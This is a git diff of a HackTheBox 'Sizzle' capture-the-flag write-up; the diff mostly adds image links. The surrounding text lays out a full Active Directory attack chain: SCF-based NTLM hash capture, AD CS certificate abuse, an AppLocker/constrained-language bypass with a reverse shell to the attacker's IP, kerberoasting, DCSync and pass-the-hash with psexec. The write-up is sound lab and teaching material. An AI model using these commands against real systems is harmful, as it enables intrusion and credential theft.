@@ -1,5 +1,5 @@
 # Sizzle [HTB](https://app.hackthebox.com/machines/169)
-![sizzle-01]()
+![sizzle-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/sizzle-01.png)
 
 
 ## Recon
@@ -10,7 +10,7 @@ After adding the target to my `/etc/hosts` file, I start scanning for open ports
 nmap -p- --min-rate 10000 sizzle.htb
 ```
 
-![ports-02]()
+![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/ports-02.png)
 
 
 From here, I send `nmap` to start probing the found ports for more information:
@@ -19,10 +19,10 @@ From here, I send `nmap` to start probing the found ports for more information:
 nmap -p 21,53,80,135,139,389,443,445,464,593,636,3268,5985,5986,9389,47001 -sCV sizzle.htb -oN nmap.result
 ```
 
-![nmap-res-03]()
-![nmap-res-04]()
-![nmap-res-05]()
-![nmap-res-06]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/nmap-res-03.png)
+![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/nmap-res-04.png)
+![nmap-res-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/nmap-res-05.png)
+![nmap-res-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/nmap-res-06.png)
 
 
 We have the following:
@@ -51,12 +51,12 @@ Let's have a look!
 
 Connecting to the FTP server anonymously does works, but the the server is empty:
 
-![empty-ftp-07]()
+![empty-ftp-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/empty-ftp-07.png)
 
 
 Trying to write files to the server is denied:
 
-![write-denied-08]()
+![write-denied-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/write-denied-08.png)
 
 
 As a last resort, I tried downloading whatever might be on the FTP server recursively, just to make sure I haven't missed anything:
@@ -75,7 +75,7 @@ Next, I turned to the IIS servers.
 
 Browsing towards `http://sizzle.htb/` returns the following page:
 
-![site-09]()
+![site-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/site-09.png)
 
 
 The HTTPS version of the site seems to be identical. I intercepted some requests in my Burp proxy to see if there are any interesting HTTP headers, or something in the source code, but it was all fairly mundane. 
@@ -108,7 +108,7 @@ I start by asking the DNS server to return any record it's willing to disclose a
 dig any htb.local @sizzle.htb
 ```
 
-![any-10]()
+![any-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/any-10.png)
 
 
 We can see there is a record here for `hostmaster.htb.local`. I mapped this entry to the external IP of the target in my `/etc/hosts` file. 
@@ -136,7 +136,7 @@ Trying to list out the available shares using a null session surprisingly works:
 smbclient -N -L \\\\sizzle.htb\\
 ``` 
 
-![smb-null-list-11]()
+![smb-null-list-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/smb-null-list-11.png)
 
 
 We can see a few interesting shares here: 
@@ -175,12 +175,12 @@ At the moment we can read or write to this share.
 
 This is the only share we have read access to and it looks as such:
 
-![department-share-12]()
+![department-share-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/department-share-12.png)
 
 
 Most of the files here are completely empty, but from the `Users` directory we can get a list of potential users on the domain:
 
-![users-13]()
+![users-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/users-13.png)
 
 
 All of the user directories are empty and we can't write to any of them, except two. We can, to the `ZZ_ARCHIVE` and `Public` directories. 
@@ -188,7 +188,7 @@ All of the user directories are empty and we can't write to any of them, except 
 
 The `ZZ_ARCHIVE` was generally useless, it had a bunch of files which seemed to be filled with null bytes. But writing to the `Users\Public` directory resulted in an interesting behaviour:
 
-![smb-write-14]()
+![smb-write-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/smb-write-14.png)
 
 
 We can see that the file was deleted fairly quickly, which tells me that there is probably some sort of script operating on this directory. I'm not sure what it's doing, but it might be doing more then just deleting files. 
@@ -215,7 +215,7 @@ responder -I tun0 -dwv
 Then, I cd into the `htb` directory, and use this simple bash loop to write all the files to the writable SMB share in bulk:
 
 ```bash
-for i in $(ls);do smbclient -N \\\\sizzle.htb\\"Department Shares" << EOF                      130 ⨯
+for i in $(ls);do smbclient -N \\\\sizzle.htb\\"Department Shares" << EOF                      
 for heredoc> cd Users\Public
 for heredoc> put $i                                             
 for heredoc> EOF
@@ -224,7 +224,7 @@ for> done
 
 After a few seconds I catch `amanda`'s NTLM hash in responder:
 
-![amanda-ntlm-15]()
+![amanda-ntlm-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/amanda-ntlm-15.png)
 
 
 After reading other people's writeup for this box, I came to find that the attack worked due to the Windows Explorer Shell Command file (.scf). In short, we can force anyone who enters a directory containing a `.scf` file to fetch a desktop icon image from an SMB server we control. You can read more about it [here](http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf).
@@ -237,7 +237,7 @@ From here, I try to crack it using hashcat:
 hashcat -m 5600 -a 0 "<entire_hash>" rockyou.txt 
 ```
 
-![cracked-16]()
+![cracked-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/cracked-16.png)
 
 
 And now we get creds of `amanda : Ashare1972`, nice! 
@@ -254,12 +254,12 @@ enum4linux -a u "amanda" -p "Ashare1972" sizzle.htb
 
 Which manages to find valid user accounts on the system:
 
-![valid-users-17]()
+![valid-users-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/valid-users-17.png)
 
 
 It also manges to give us `amanda`'s SMB privileges:
 
-![smb-privs-18]()
+![smb-privs-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/smb-privs-18.png)
 
 
 We can also use the creds to enumerate the LDAP server with:
@@ -278,7 +278,7 @@ After a bit of looking around and enumerating the target as `amanda`, I didn't f
 
 Instead, I decided to get back to the certificate web enrollment feature we found earlier through the SMB share. As `amanda` we can now list the contents of the `CertEnroll` share, though it's not super useful:
 
-![certenroll-19]()
+![certenroll-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/certenroll-19.png)
 
 
 The real question is where the AD CS web enrollment is located. Based on [this post](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/retrieve-base-and-delta-crl) from Microsoft, the AD CS web enrollment endpoint should be located at `http://<servername>/certsrv`
@@ -286,12 +286,12 @@ The real question is where the AD CS web enrollment is located. Based on [this p
 
 Browsing towards `http://sizzle.htb.local/certsrv`, does in fact prompt me for credentials:
 
-![certsrv-20]()
+![certsrv-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/certsrv-20.png)
 
 
 After suppling `amanda`'s creds, I get inside:
 
-![logged-21]()
+![logged-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/logged-21.png)
 
 
 How do we exploit this? 
@@ -320,7 +320,7 @@ Based on [this post](https://learn.microsoft.com/en-us/powershell/scripting/lear
 
 If we go back to the certificates web enrollment, and click on `Request a certificate`, we will see the following page:
 
-![request-22]()
+![request-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/request-22.png)
 
 
 The first link of `User Certificate` for some reason didn't work for me, though I've seen other people use it to solve sizzle. So I was left with the advanced certificate reqeust.
@@ -328,7 +328,7 @@ The first link of `User Certificate` for some reason didn't work for me, though 
 
 If we click on that link we are brought to the following page:
 
-![advanced-23]()
+![advanced-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/advanced-23.png)
 
 
 We can see the page is asking a certificate singing request (.csr) file. Generating this kind of file from scratch is fairly trivial using `openssl`.
@@ -340,7 +340,7 @@ First, I create my private key:
 openssl genrsa -aes256 -out my.key 2048
 ```
 
-![genrsa-24]()
+![genrsa-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/genrsa-24.png)
 
 
 Next, I generate the needed certificate signing request:
@@ -349,7 +349,7 @@ Next, I generate the needed certificate signing request:
 openssl req -new -key my.key -out my.csr
 ```
 
-![gencsr-25]()
+![gencsr-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/gencsr-25.png)
 
 
 I leave all the input fields empty accept for the `Common Name` field, to which I supply the FQDN of our target `sizzle.htb.local`.
@@ -357,12 +357,12 @@ I leave all the input fields empty accept for the `Common Name` field, to which 
 
 I then `cat` out the contents of our newly created `my.csr` file, and paste it to the AD CS web interface as such:
 
-![submit-26]()
+![submit-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/submit-26.png)
 
 
 I hit the the `Submit` button, and my request is accepted immediately. I then get the option to download my newaly signed certificate:
 
-![cert-27]()
+![cert-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/cert-27.png)
 
 
 From here, we can use it to connect to the HTTPS WinRM endpoint. Typically, we would use `evil-winrm` to connect to a target Windows machine from a Linux client, but since we are using certificate based authentication, we need to use a custom script for it, which is [winrm_shell.rb](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) from `Alamot`.
@@ -370,7 +370,7 @@ From here, we can use it to connect to the HTTPS WinRM endpoint. Typically, we w
 
 After downloading the script I make a few adjustments so we can login with our certificate:
 
-![modify-28]()
+![modify-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/modify-28.png)
 
 
 I link my certificate, private key, and the password for it (so it won't prompt me for it every 2 minutes) and point to the HTTPS WinRM endpoint running on port 5986. 
@@ -378,7 +378,7 @@ I link my certificate, private key, and the password for it (so it won't prompt 
 
 After executing the script I get a shell:
 
-![shell-29]()
+![shell-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/shell-29.png)
 
 
 ## Privilege Escalation
@@ -392,7 +392,7 @@ While poking around the system, I've noticed that we are in a constrained powers
 $ExecutionContext.SessionState.LanguageMode
 ```
 
-![constrained-29.5]()
+![constrained-29.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/constrained-29.5.png)
 
 
 To bypass this, we can use something like [PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM). I decided to use the available compiled version at `PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/x64/Debug/` as our target's architecture is X64:
@@ -401,7 +401,7 @@ To bypass this, we can use something like [PSByPassCLM](https://github.com/padov
 $Env:PROCESSOR_ARCHITECTURE
 ```
 
-![arch-30]()
+![arch-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/arch-30.png)
 
 
 Because we are in a constrained shell, most file transfer methods will be blocked. Though I found that we can transfer files using an SMB server. 
@@ -420,12 +420,12 @@ net use \\10.10.14.51\s /u:htb htb
 copy \\10.10.14.51\s\bypassCLM.exe 
 ```
 
-![copy-31]()
+![copy-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/copy-31.png)
 
 
 But when executing the file I got denied:
 
-![blocked-32]()
+![blocked-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/blocked-32.png)
 
 
 The error message says that execution has been blocked by group policy. I have a hunch that it might be AppLocker. 
@@ -437,7 +437,7 @@ We can list the AppLocker policies with:
 Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
 ```
 
-![policy-33]()
+![policy-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/execute-33.png)
 
 
 The Description and Name are a bit deseptive, as the policy dosn't really effect `C:\\Program Files`. Instead, `%OSDRIVE%\tmp\*` refers to `C:\\Windows\Temp`. Therefore, we can place the `PsBypassCLM.exe` binary at `C:\\Windows\Temp` and execute it from there. 
@@ -455,11 +455,11 @@ Next, I execute `PsBypassCLM.exe` with the `revshell` option to connect back to 
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.51 /rport=443 c:\\users\amanda\appdata\local\temp\bypassCLM.exe
 ```
 
-![execute-34]()
+![execute-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/execute-34.png)
 
 Which gives me a full powershell session:
 
-![full-session-35]()
+![full-session-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/full-session-35.png)
 
 
 After which I kept looking around the system. Eventually I decided to list out the open ports on the target using:
@@ -468,7 +468,7 @@ After which I kept looking around the system. Eventually I decided to list out t
 netstat -ano | findstr TCP 
 ``` 
 
-![netstat-36]()
+![netstat-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/netstat-36.png)
 
 
 We can see port 88 is open on the target, though it didn't show up in our `nmap` scan. This probably means that it has been blocked off by a firewall. Port 88 is where the kerberos authentication takes place, and the fact that this port has been blocked by the firewall tells me there is more to it. Specifically, we want to test for [kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast).
@@ -513,7 +513,7 @@ Now, we can try to locate any kerberostable users with the following command:
 .\r.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
 ```
 
-![kerberostable-37]()
+![kerberostable-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/kerberostable-37.png)
 
 
 We can see that `mrlky` is vulnerable, and we managed to get his TGS ticket. From here, we can try to crack it with `hashcat` as such:
@@ -524,29 +524,29 @@ hashcat -m 13100 -a 0 "<entire_hash>" rockyou.txt
 
 Which cracks to `Football#7`:
 
-![cracks-38]()
+![cracks-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/cracks-38.png)
 
 
 Now I just repeat the process for requesting a user certificate from the AD CS web interface. I get a new certificate for `mrlky`, I modify my `winrm_shell.rb` to load he's certificate and I login to the system:
 
-![mrlky-39]()
+![mrlky-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/mrlky-39.png)
 
 
 ### Mrlky
 
 After landing on a shell as `mrlky` we are put into a constrained environment again:
 
-![constrained-40]()
+![constrained-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/constrained-40.png)
 
 
 So I repeat the process from before using `PSByPassCLM`, this time from `C:\\Users\mrlky\appdata\local\temp`:
 
-![exec-41]()
+![exec-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/exec-41.png)
 
 
 And now I have a full shell again:
 
-![full-42]()
+![full-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/full-42.png)
 
 
 At this point I enumerated the system some more, just to see if there are any new escalation vectors now that we have a shell as `mrlky`, but I didn't notice anything substantial.
@@ -569,7 +569,7 @@ I then run the collector script from `C:\\Windows\Temp` as such:
 
 The execution went well, and if we cd into `mrlky`'s home folder we can see our loot:
 
-![loot-43]()
+![loot-43](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/loot-43.png)
 
 
 To transfer the zip archive to my attack machine, I use the same SMB server from before, only this time I write to it from the target as such:
@@ -580,7 +580,7 @@ copy 20240124024539_BloodHound.zip \\10.10.14.51\s\
 
 And now I have the zip archvie on my attack machine:
 
-![got-zip-44]()
+![got-zip-44](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/got-zip-44-.png)
 
 
 From here we need to lunch [bloodhound](https://github.com/BloodHoundAD/BloodHound), and upload the data we've just retrieved from the target. 
@@ -591,12 +591,12 @@ Once the data has been loaded, I start playing around with different queires, lo
 
 In the `Dangerous Privileges` tab, I select the `Find principals with DCSync rights` query, which looks like this:
 
-![dcsync-rights-45]()
+![dcsync-rights-45](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/dcsync-rights-45.png)
 
 
 We can see that our user `mrlky`, has some DCSync rights over the `htb.local` domain, if we right click on this link, and select `info`, we can see the following message:
 
-![info-46]()
+![info-46](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/info-46.png)
 
 
 Which means we can try to pull of a [DCSync attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync). 
@@ -611,7 +611,7 @@ To get the NTLM hash of the administrator we can run something like this:
 impacket-secretsdump -just-dc mrlky:Football#7@sizzle.htb -just-dc-user administrator
 ```
 
-![hash-47]()
+![hash-47](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/hash-47.png)
 
 
 From here we can try to crack the hash, or we can just pass it to `psexec` and get a shell:
@@ -620,4 +620,4 @@ From here we can try to crack the hash, or we can just pass it to `psexec` and g
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 administrator@sizzle.htb
 ```
 
-![root-48]()
+![root-48](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/root-48.png)
